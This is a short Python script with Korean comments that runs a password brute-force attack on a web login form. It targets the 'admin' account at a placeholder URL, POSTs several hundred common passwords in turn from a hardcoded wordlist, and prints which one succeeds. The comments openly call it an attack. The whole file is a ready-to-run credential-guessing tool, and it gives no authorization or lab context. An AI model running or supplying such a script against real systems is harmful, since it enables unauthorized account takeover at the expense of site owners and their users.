import requests

# 타겟 웹 사이트의 로그인 URL
url = "http://example.com/login"

# 공격에 사용할 아이디 및 비밀번호 리스트
username = "admin"
password_list = [
    "123456", "password", "admin", "welcome", "letmein", "qwerty", "123456789", "12345", "123123", "password1",
    "1234", "000000", "12345678", "abc123", "654321", "superman", "1q2w3e4r", "monkey", "696969", "123qwe",
    "password123", "111111", "123321", "123abc", "football", "sunshine", "master", "hello", "freedom", "whatever",
    "asdfgh", "zxcvbn", "trustno1", "batman", "letitbe", "liverpool", "1234567", "qwerty123", "michael", "secret",
    "dragon", "mustang", "iloveyou", "admin123", "welcome1", "ninja", "shadow", "princess", "baseball", "qazwsx",
    "qwe123", "solo", "starwars", "matrix", "skywalker", "asdf1234", "hunter", "charlie", "passw0rd", "silver",
    "pepper", "banana", "chelsea", "ashley", "soccer", "987654321", "q1w2e3r4", "tigger", "test123", "cookie",
    "computer", "michelle", "zaq12wsx", "password!", "merlin", "letmein123", "super123", "rockyou", "biteme",
    "spiderman", "batman123", "password2", "supersecret", "lucky", "password4", "welcome123", "qwertyuiop",
    "thunder", "summer", "password0", "hello123", "loveyou", "welcome2", "trustnoone", "mercedes", "cookie123",
    "happiness", "!qaz2wsx", "ranger", "star", "blue", "asdf", "ghjk", "cvbn", "123pass", "pass123", "trustme",
    "onetwo", "secret123", "happy", "flower", "galaxy", "journey", "strongpass", "default", "temp", "jordan",
    "super", "eagle", "lifeisgood", "batman1", "batman2", "success", "harley", "tinkerbell", "spidey",
    "redbull", "cocacola", "password11", "password22", "ultimate", "mypass", "letmeinplease", "opensesame",
    "magicword", "highlander", "immortal", "wonderwoman", "password99", "password88", "batman99", "superman99",
    "freedom1", "freedom2", "galaxy123", "universe", "hello2023", "admin1", "admin2", "admin999", "rainbow",
    "superstar", "music", "guitar", "classical", "movie", "cinema", "hollywood", "bollywood", "popcorn",
    "hello_world", "python", "javascript", "hello1234", "goodday", "badboy", "goodgirl", "scoobydoo", "velvet",
    "black", "white", "yellow", "123098", "zxcv123", "trouble", "testing", "welcomehome", "password007", "secure",
    "simplepass", "complex", "voldemort", "harrypotter", "hogwarts", "gryffindor", "slytherin", "blueberry",
    "password@", "skyblue", "seashore", "mountain", "password3", "password5", "amazing", "beautiful", "wonderful",
    "default123", "changeit", "november", "december", "october", "september", "august", "july", "june", "may",
    "spring", "winter", "summer2023", "autumn", "fire", "water", "earth", "air", "element", "captain",
    "amazing123", "testing123", "password2023", "password2024", "defaultpass", "thematrix", "cyberpunk", "swordfish",
    "bluebird", "lionking", "titanic", "jurassic", "frozen", "elsa", "olaf", "spirit", "miracle", "golden",
    "green", "greengrass", "beach", "forest", "meadow", "chocolate", "vanilla", "espresso", "coffee123",
    "password10", "password12", "lucky7", "lucky13", "matrix123", "reloaded", "revolution", "neo", "trinity",
    "morpheus", "oracle", "zi0n", "matrix001", "password33", "33password", "number1", "number9", "cloud9",
    "storm", "wind", "wave", "ocean", "password19", "securepassword", "faster", "strong", "fortress", "castle",
    "kingdom", "space", "alien", "star123", "martian", "pluto", "venus", "password55", "secret555", "sunshine99",
    "password900", "freepass", "default0", "defaultpassword", "temp123", "temporary", "permanent", "mypass123"
]

# 비밀번호 무차별 대입 공격 수행 (기존 비밀번호 리스트 사용)
def brute_force_login(url, username, password_list):
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Login successful" in response.text:
            print(f"[+] 로그인 성공! 비밀번호: {password}")
            return True
        else:
            print(f"[-] 로그인 실패. 시도한 비밀번호: {password}")
    
    print("[!] 비밀번호 리스트 내에 올바른 비밀번호가 없습니다.")
    return False

# 실행
brute_force_login(url, username, password_list)
